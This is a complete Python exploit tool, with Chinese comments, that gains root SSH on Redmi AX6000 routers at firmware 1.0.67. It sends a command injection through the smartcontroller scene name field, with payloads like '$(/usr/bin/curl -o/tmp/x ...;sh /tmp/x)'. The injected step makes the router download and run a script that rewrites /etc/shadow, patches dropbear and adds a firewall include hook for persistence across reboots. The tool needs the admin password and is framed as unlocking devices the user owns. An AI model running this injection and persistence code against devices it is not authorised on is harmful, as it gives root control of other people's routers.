#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
redmi_wifi_ssh.py — Redmi 路由器 AX6000（miwifi RB06）1.0.67 一键开启 root SSH

适用设备:
  Redmi 路由器 AX6000（型号 RB06 / 小米固件 miwifi_rb06）
适用固件:
  1.0.67
固件下载:
  https://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rb06/miwifi_rb06_firmware_de54d_1.0.67.bin
固件 MD5:
  9adc67d8b5bd6dce8bff80cc0b5de54d

================================ 功能 ================================
输入路由器 IP 和后台管理密码，脚本会：
  1. 调用路由器 Web API 登录，获取 stok
     （兼容 newEncryptMode=1 的 SHA-256 流程和旧版 SHA-1 流程）
  2. 通过 smartcontroller 场景 name 命令注入（CVE-2023-26319 类）执行 root 命令
  3. 把系统 root 的登录密码设置为“后台管理密码”
  4. 立即启动 dropbear —— SSH 当场可用，不需要重启路由器
  5. 写入持久化开机脚本，路由器重启后 SSH 自动恢复，密码仍为后台管理密码

================================ 用法 ================================
  python3 redmi_wifi_ssh.py <路由器IP> '<后台管理密码>'
  python3 redmi_wifi_ssh.py <路由器IP> --password '<后台管理密码>'
  python3 redmi_wifi_ssh.py <路由器IP>                 # 交互输入密码

示例：
  python3 redmi_wifi_ssh.py 192.168.31.1 'my-password'
  python3 redmi_wifi_ssh.py 10.0.0.142 --no-verify
  python3 redmi_wifi_ssh.py 10.0.0.142 --listen-ip 10.0.0.100 'my-password'

================================ 参数 ================================
  ip                  路由器管理地址（必填，位置参数 1）
  password_pos        后台管理密码（位置参数 2；可省略）
  --password          后台管理密码（与 password_pos 二选一）
  --user              SSH 用户名，默认 root
  --port              SSH 端口，默认 22
  --no-verify         只检查 22 端口，不自动验证密码登录
  --listen-ip         本机用于让路由器下载脚本的 IP（默认自动探测）

============================ 持久化原理 ==============================
RB06 1.0.67 的 /etc 是 ramfs（重启即丢），只有 /data、/etc/config 等挂在 UBI 上。
因此本脚本采用：
  - 开机脚本放在 /data/xq_ssh/boot.sh（UBI 持久）
  - 在 /etc/config/firewall 里注册 include 钩子，开机时以 root 执行该脚本
  - boot.sh 每次开机：
      * 重设 /etc/shadow 的 root 密码哈希（= 后台密码）
      * 从 /data 恢复 dropbear 主机密钥（重启后 host key 不变）
      * 重新 patch /etc/init.d/dropbear 的 release 渠道检查（/etc 是 ramfs）
      * 启动 dropbear（官方 procd 服务，失败则直接兜底启动）
  - 当前 boot 周期由脚本立即执行一次 boot.sh，因此开启 SSH 不需要重启

============================ 环境要求 ================================
  - Python 3.7+，Windows / Linux / macOS 均可，纯标准库、无第三方依赖
  - 本机需要能被路由器访问：脚本会临时在 0.0.0.0 上启动 HTTP 服务，
    供路由器下载配置脚本。Windows 防火墙弹窗请允许“专用网络”。
  - 可选：sshpass（Linux/macOS）用于自动验证密码登录；
    Windows 默认没有 sshpass，脚本会只检查 22 端口，不自动验证密码。

============================ 注意事项 ================================
  - 脚本会重启 dropbear 服务，请勿通过 SSH 会话运行（会断开当前连接）；
    在本机直接运行即可。
  - 后台密码连续错误会触发路由器登录锁定，脚本只尝试一次登录。
  - 修改后台密码后，重新运行本脚本即可同步 SSH 密码。
  - 关闭 SSH（同时移除持久化钩子）:
      ssh root@<路由器IP> "/sbin/uci delete firewall.xq_ssh; /sbin/uci commit firewall; killall dropbear; rm -rf /data/xq_ssh"
  - 仅用于你拥有或已获得明确授权的设备。
"""

import argparse
import getpass
import hashlib
import http.server
import json
import os
import random
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
import urllib.request

# XQSecureUtil 中的固定 salt，用于登录密码哈希
LOGIN_KEY = "a2ffa5c9be07488bbb04a3a47d3c5f6a"

# 场景 action 需要一个 MAC；脚本结束时会清理这条 dummy macfilter 规则
DUMMY_MAC = "00:11:22:33:44:55"

# smartcontroller 场景 name 实际执行上限约 55 字节，留一点余量
MAX_SCENE_NAME = 55

# MD5-crypt 的自定义 base64 字母表
ITOA64 = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"


# ----------------------------------------------------------------------
# 基础输出
# ----------------------------------------------------------------------
def log(msg):
    print("[*] " + str(msg), flush=True)


def die(msg):
    print("[!] " + str(msg), file=sys.stderr, flush=True)
    sys.exit(1)


# ----------------------------------------------------------------------
# HTTP 工具
# ----------------------------------------------------------------------
def http_get(url, timeout=10):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def http_post(url, data, timeout=15):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(
        url, data=body, headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def api(ip, path, params=None, post=False, timeout=10):
    url = "http://%s%s" % (ip, path)
    if params:
        if post:
            return http_post(url, params, timeout=timeout)
        url += "?" + urllib.parse.urlencode(params)
    return http_get(url, timeout=timeout)


# ----------------------------------------------------------------------
# 登录：用后台密码换取 stok
# ----------------------------------------------------------------------
def login(ip, password):
    """
    兼容两种加密模式：
      newEncryptMode=1: password = sha256(nonce + sha256(明文密码 + LOGIN_KEY))
      旧版:              password = sha1(nonce + sha1(明文密码 + LOGIN_KEY))
    nonce 中的 mac 取自 /api/misystem/router_info（路由器自身 MAC）。
    """
    try:
        info = json.loads(api(ip, "/cgi-bin/luci/api/misystem/router_info"))
        mac = info.get("mac", "")
    except Exception:
        mac = ""

    try:
        init = json.loads(api(ip, "/cgi-bin/luci/api/xqsystem/init_info"))
        new_mode = int(init.get("newEncryptMode", 0)) == 1
    except Exception:
        new_mode = True

    nonce = "0_%s_%d_%d" % (mac, int(time.time()), random.randint(0, 9999))
    if new_mode:
        inner = hashlib.sha256((password + LOGIN_KEY).encode()).hexdigest()
        outer = hashlib.sha256((nonce + inner).encode()).hexdigest()
    else:
        inner = hashlib.sha1((password + LOGIN_KEY).encode()).hexdigest()
        outer = hashlib.sha1((nonce + inner).encode()).hexdigest()

    params = {
        "username": "admin",
        "logtype": 2,
        "nonce": nonce,
        "password": outer,
        "init": 0,
    }
    last = None
    for post in (False, True):  # 先 GET，部分固件只接受 POST
        try:
            body = api(ip, "/cgi-bin/luci/api/xqsystem/login", params, post=post)
            r = json.loads(body)
        except Exception as e:
            last = str(e)
            continue
        if r.get("code") == 0 and r.get("token"):
            return r["token"]
        last = r
        if r.get("code") == 401:  # 密码错误：不再重试，避免触发 4 次锁定
            break
    die("登录失败: %s（若为密码错误，请勿反复尝试，路由器可能锁定登录）" % last)


# ----------------------------------------------------------------------
# MD5-crypt：纯 Python 实现，Windows 上也不需要 OpenSSL
# ----------------------------------------------------------------------
def _to64(value, count):
    out = []
    for _ in range(count):
        out.append(ITOA64[value & 0x3F])
        value >>= 6
    return "".join(out)


def md5_crypt(password, salt):
    """返回 $1$salt$hash 形式的 MD5-crypt，与 openssl passwd -1 兼容。"""
    pw = password.encode("utf-8")
    sl = salt.encode("ascii")[:8]
    magic = b"$1$"

    ctx = hashlib.md5()
    ctx.update(pw + magic + sl)
    final = hashlib.md5(pw + sl + pw).digest()

    # 按密码长度，每 16 字节追加一次 final
    pl = len(pw)
    while pl > 0:
        ctx.update(final[: min(pl, 16)])
        pl -= 16

    # 密码长度的二进制位：1 -> 0x00，0 -> 密码首字节
    i = len(pw)
    while i:
        ctx.update(b"\x00" if (i & 1) else pw[:1])
        i >>= 1
    final = ctx.digest()

    # 1000 轮
    for i in range(1000):
        c = hashlib.md5()
        c.update(pw if (i & 1) else final)
        if i % 3:
            c.update(sl)
        if i % 7:
            c.update(pw)
        c.update(final if (i & 1) else pw)
        final = c.digest()

    enc = (
        _to64((final[0] << 16) | (final[6] << 8) | final[12], 4)
        + _to64((final[1] << 16) | (final[7] << 8) | final[13], 4)
        + _to64((final[2] << 16) | (final[8] << 8) | final[14], 4)
        + _to64((final[3] << 16) | (final[9] << 8) | final[15], 4)
        + _to64((final[4] << 16) | (final[10] << 8) | final[5], 4)
        + _to64(final[11], 2)
    )
    return "$1$" + sl.decode("ascii") + "$" + enc


def make_shadow_hash(password):
    """生成 /etc/shadow 使用的密码哈希（随机 8 位 salt）。"""
    if not password:
        die("后台管理密码不能为空")
    salt = "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(8))
    return md5_crypt(password, salt)


# ----------------------------------------------------------------------
# 本机地址探测
# ----------------------------------------------------------------------
def local_ip_for(router_ip):
    """返回本机访问路由器时使用的源 IP（路由器需要能访问这个地址下载配置脚本）。"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((router_ip, 80))
        return s.getsockname()[0]
    finally:
        s.close()


# ----------------------------------------------------------------------
# 在路由器上执行的配置脚本
# ----------------------------------------------------------------------
def build_setup_script(hashstr):
    """
    该脚本由路由器 root 执行（通过场景注入下载后 sh 运行）。
    1) 清理旧版本遗留的 ramfs 服务
    2) 写入 /data/xq_ssh/boot.sh（持久化开机脚本）
    3) 立即执行 boot.sh（当前 boot 生效）
    4) 注册 firewall include（/etc/config 在 UBI 上，重启后仍存在）
    5) 清理场景 action 产生的 dummy macfilter 规则
    """
    return """#!/bin/sh
PATH=/usr/sbin:/usr/bin:/sbin:/bin

# 1) 清理当前 boot 周期内旧的服务（/etc 是 ramfs，重启后本来也会丢）
/etc/init.d/xqssh stop 2>/dev/null
/etc/init.d/xqssh disable 2>/dev/null
rm -f /etc/init.d/xqssh /etc/init.d/xqssh_hash
killall dropbear 2>/dev/null
sleep 1

# 2) 持久化脚本放到 /data（UBI，重启不丢）
mkdir -p /data/xq_ssh
cat > /data/xq_ssh/boot.sh <<'XEOF'
#!/bin/sh
PATH=/usr/sbin:/usr/bin:/sbin:/bin

# /etc 是 ramfs，每次开机都必须重设 root 密码哈希
sed -i 's|^root:[^:]*:|root:%(hash)s:|' /etc/shadow
chmod 600 /etc/shadow
chown root:root /etc/shadow

# 保证 ssh_en 开关为 1
[ "$(nvram get ssh_en)" = "1" ] || { nvram set ssh_en=1; nvram commit; }

# 已有 dropbear 就不重复启动
if ! pidof dropbear >/dev/null 2>&1; then
  # 主机密钥持久化到 /data（/etc 是 ramfs，重启会丢）
  mkdir -p /data/xq_ssh
  if [ -s /data/xq_ssh/dropbear_rsa_host_key ]; then
    cp -f /data/xq_ssh/dropbear_rsa_host_key /etc/dropbear/dropbear_rsa_host_key
    chmod 600 /etc/dropbear/dropbear_rsa_host_key
  else
    if [ ! -s /etc/dropbear/dropbear_rsa_host_key ]; then
      rm -f /etc/dropbear/dropbear_rsa_host_key
      /usr/bin/dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key >/dev/null 2>&1
    fi
    cp -f /etc/dropbear/dropbear_rsa_host_key /data/xq_ssh/dropbear_rsa_host_key 2>/dev/null
  fi
  # /etc/init.d 也是 ramfs，每次开机都要 patch 掉 release 渠道检查
  sed -i 's/^[[:space:]]*channel=.*/channel="debug"/' /etc/init.d/dropbear
  /etc/init.d/dropbear restart >/dev/null 2>&1
  sleep 1
  # procd 启动失败时直接兜底
  pidof dropbear >/dev/null 2>&1 || /usr/sbin/dropbear -R -p 22 -P /var/run/dropbear.pid >/dev/null 2>&1
fi
exit 0
XEOF
chmod 755 /data/xq_ssh/boot.sh

# 3) 当前 boot 立即生效（不需要重启路由器）
/data/xq_ssh/boot.sh

# 4) /etc/config 在 UBI 上：firewall include 每次开机执行持久化脚本
/sbin/uci set firewall.xq_ssh=include
/sbin/uci set firewall.xq_ssh.type='script'
/sbin/uci set firewall.xq_ssh.path='/data/xq_ssh/boot.sh'
/sbin/uci set firewall.xq_ssh.enabled='1'
/sbin/uci commit firewall

# 5) 清理场景 action 产生的 dummy macfilter 规则
/usr/sbin/sysapi macfilter del %(mac)s >/dev/null 2>&1
rm -f /tmp/x
""" % {"hash": hashstr, "mac": DUMMY_MAC}


# ----------------------------------------------------------------------
# 本地 HTTP 服务：给路由器下载配置脚本
# ----------------------------------------------------------------------
class PayloadServer(object):
    def __init__(self, payload):
        self.payload = payload
        outer = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path.startswith("/x"):
                    data = outer.payload
                    self.send_response(200)
                    self.send_header("Content-Type", "application/octet-stream")
                    self.send_header("Content-Length", str(len(data)))
                    self.end_headers()
                    self.wfile.write(data)
                else:
                    self.send_response(404)
                    self.end_headers()

            def log_message(self, *args):
                pass

        # 绑定 0.0.0.0：Windows/Linux/macOS 通用，避免多网卡时绑定错误
        self.httpd = http.server.ThreadingHTTPServer(("0.0.0.0", 0), Handler)
        self.port = self.httpd.server_address[1]
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)

    def start(self):
        self.thread.start()

    def stop(self):
        try:
            self.httpd.shutdown()
            self.httpd.server_close()
        except Exception:
            pass


# ----------------------------------------------------------------------
# 场景注入
# ----------------------------------------------------------------------
def scene_exec(ip, stok, name):
    """
    创建带 name 注入的场景并启动，然后删除场景。
    name 形如 '$(command)'：feedPush 用单引号包裹 name，
    开头的单引号会闭合引号，使 $(command) 被 shell 执行。
    """
    base = "http://%s/cgi-bin/luci/;stok=%s/api/xqsmarthome/request_smartcontroller" % (ip, stok)
    scene = {
        "command": "scene_setting",
        "name": name,
        "action_list": [{
            "thirdParty": "xmrouter",
            "delay": 0,
            "type": "wan_unblock",
            "payload": {"command": "wan_unblock", "mac": DUMMY_MAC},
        }],
        "launch": {"timer": {"time": "3:%d" % random.randint(10, 59), "repeat": "0", "enabled": True}},
    }
    r = json.loads(http_post(base, {"payload": json.dumps(scene, separators=(",", ":"))}))
    if r.get("code") != 0:
        raise RuntimeError("scene_setting failed: %s" % r)
    sid = r["id"]
    try:
        r2 = json.loads(http_post(base, {"payload": json.dumps({"command": "scene_start", "id": sid})}))
        if r2.get("code") != 0:
            raise RuntimeError("scene_start failed: %s" % r2)
        time.sleep(3)  # 给 smartcontroller 留出执行 action/feedPush 的时间，避免立即删场景
    finally:
        try:
            http_post(base, {"payload": json.dumps({"command": "scene_delete", "id": sid})})
        except Exception:
            pass


def run_payload(ip, stok, lip, lport):
    """
    下载并执行 /data 配置脚本。
    场景 name 实际执行上限约 55 字节，放不下时拆成“下载”和“执行”两步。
    """
    url = "%s:%d/x" % (lip, lport)
    combined = "'$(/usr/bin/curl -o/tmp/x %s;sh /tmp/x)'" % url
    if len(combined.encode()) <= MAX_SCENE_NAME:
        log("执行: %s" % combined)
        scene_exec(ip, stok, combined)
        return

    step1 = "'$(/usr/bin/curl -o/tmp/x %s)'" % url
    step2 = "'$(sh /tmp/x)'"
    if len(step1.encode()) > MAX_SCENE_NAME:
        die("本机地址太长，场景 name 放不下下载命令；请用 --listen-ip 指定更短的 IPv4")
    log("分两步执行: %s" % step1)
    scene_exec(ip, stok, step1)
    time.sleep(1)
    log("分两步执行: %s" % step2)
    scene_exec(ip, stok, step2)


# ----------------------------------------------------------------------
# SSH 连通性/登录验证
# ----------------------------------------------------------------------
def port_open(ip, port=22, timeout=2.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        try:
            banner = s.recv(128)
        except Exception:
            banner = b""
        return True, banner
    except Exception:
        return False, b""
    finally:
        s.close()


def verify_ssh(ip, password, user="root", port=22):
    """
    用 sshpass 验证 root+密码 登录。
    Windows 默认没有 sshpass，会跳过并提示手动验证。
    """
    sshpass = shutil.which("sshpass")
    if not sshpass:
        log("未找到 sshpass（Windows 默认没有），跳过自动密码验证")
        manual_cmd = "ssh -o HostKeyAlgorithms=+ssh-rsa"
        if port != 22:
            manual_cmd += " -p %d" % port
        manual_cmd += " %s@%s" % (user, ip)
        log("请手动执行: %s" % manual_cmd)
        return False

    fd, pwfile = tempfile.mkstemp(prefix=".xqpw_")
    try:
        os.write(fd, (password + "\n").encode())
        os.close(fd)
        if os.name != "nt":
            os.chmod(pwfile, 0o600)
        cmd = [
            sshpass, "-f", pwfile,
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "HostKeyAlgorithms=+ssh-rsa",
            "-o", "PubkeyAcceptedAlgorithms=+ssh-rsa",
            "-o", "PreferredAuthentications=password",
            "-o", "NumberOfPasswordPrompts=1",
            "-o", "ConnectTimeout=8",
            "-p", str(port),
            "%s@%s" % (user, ip),
            "id; test -x /data/xq_ssh/boot.sh && "
            "[ \"$(/sbin/uci -q get firewall.xq_ssh.path)\" = \"/data/xq_ssh/boot.sh\" ] "
            "&& echo PERSIST_OK",
        ]
        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=20)
        out = (p.stdout + p.stderr).decode("utf-8", "replace").strip()
        if p.returncode == 0 and "uid=0(root)" in out:
            log("SSH 密码登录验证成功: %s" % out.splitlines()[0])
            if "PERSIST_OK" in out:
                log("持久化配置验证成功（重启后会自动恢复 SSH）")
            else:
                log("提示: 未能确认持久化配置，请检查 /data/xq_ssh/boot.sh 和 firewall include")
            return True
        log("SSH 已启动，但密码登录验证未通过 (rc=%d): %s" % (p.returncode, out[:200]))
        return False
    except Exception as e:
        log("SSH 验证异常: %s" % e)
        return False
    finally:
        try:
            os.unlink(pwfile)
        except Exception:
            pass


# ----------------------------------------------------------------------
# 主流程
# ----------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="Redmi 路由器 AX6000（miwifi RB06）1.0.67 一键开启 root SSH（密码=后台密码，重启后仍生效）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例:\n"
            "  python3 redmi_wifi_ssh.py 192.168.31.1 '后台密码'\n"
            "  python3 redmi_wifi_ssh.py 10.0.0.142 --password '后台密码'\n"
            "  python3 redmi_wifi_ssh.py 10.0.0.142          # 交互输入密码\n"
        ),
    )
    parser.add_argument("ip", help="路由器 IP，例如 192.168.31.1")
    parser.add_argument("password_pos", nargs="?", help="后台管理密码（位置参数 2，可省略）")
    parser.add_argument("--password", help="后台管理密码（与位置参数 2 二选一）")
    parser.add_argument("--user", default="root", help="SSH 用户名（默认 root）")
    parser.add_argument("--port", type=int, default=22, help="SSH 端口（默认 22）")
    parser.add_argument("--no-verify", action="store_true", help="不自动验证 SSH 密码登录")
    parser.add_argument("--listen-ip", help="本机用于让路由器下载脚本的 IP（默认自动探测）")
    args = parser.parse_args()

    password = args.password or args.password_pos
    if password is None:
        password = getpass.getpass("后台管理密码: ")
    if not password:
        die("后台管理密码不能为空")

    ip = args.ip

    log("登录 %s ..." % ip)
    stok = login(ip, password)
    log("登录成功，stok=%s..." % stok[:8])

    hashstr = make_shadow_hash(password)
    log("已生成 root 密码哈希: %s..." % hashstr[:12])

    lip = args.listen_ip or local_ip_for(ip)
    log("本机下载地址: %s" % lip)

    srv = PayloadServer(b"")
    payload = build_setup_script(hashstr).encode()
    srv.payload = payload
    srv.start()

    try:
        # 本地自检，确认 HTTP 服务可用
        try:
            code = urllib.request.urlopen("http://127.0.0.1:%d/x" % srv.port, timeout=5).getcode()
            log("本地 HTTP 服务: http://%s:%d/x (自检 %s)" % (lip, srv.port, code))
        except Exception as e:
            die("本地 HTTP 服务自检失败: %s" % e)

        run_payload(ip, stok, lip, srv.port)

        # 检查 22 端口
        banner_ok = False
        for _ in range(40):
            ok, banner = port_open(ip, args.port)
            if ok:
                banner_ok = True
                # 只取 SSH 版本行，避免把后面的二进制握手包当成文本打印
                line = banner.split(b"\r\n", 1)[0].split(b"\n", 1)[0]
                chars = []
                for c in line:
                    if 32 <= c < 127:
                        chars.append(chr(c))
                    else:
                        break
                log("SSH 端口已开放: %s" % ("".join(chars) or "(无 banner)"))
                break
            time.sleep(0.5)
        if not banner_ok:
            die("SSH 端口未开放：请检查本机防火墙是否允许路由器访问 %s:%d，以及 22 端口是否被占用" % (lip, srv.port))

        if not args.no_verify:
            verify_ssh(ip, password, args.user, args.port)

        ssh_cmd = "ssh -o HostKeyAlgorithms=+ssh-rsa"
        if args.port != 22:
            ssh_cmd += " -p %d" % args.port
        ssh_cmd += " %s@%s" % (args.user, ip)
        print("")
        print(ssh_cmd)
        print("# 以上为 SSH 连接命令，SSH 密码 = Web 后台管理密码")
    finally:
        srv.stop()


if __name__ == "__main__":
    main()